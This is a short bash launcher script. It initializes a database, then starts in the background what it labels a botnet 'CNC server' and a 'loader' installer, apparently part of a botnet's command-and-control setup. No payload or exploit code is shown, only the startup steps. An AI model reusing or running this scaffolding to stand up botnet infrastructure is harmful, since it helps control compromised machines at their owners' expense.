#!/bin/bash


echo "Initializing the Database"

./init.sh

echo "Database Initialized"
echo "setting up config"


sleep 3

echo "Starting the CNC server"

cd botnet

nohup python server.py &

echo "The CNC Server is up and running"

echo "The PiD for the server Process "
lsof -i:5000

echo "Starting the loader"

cd ../loader

nohup python installer.py &

cd ../botnet

./run.sh

sleep 2

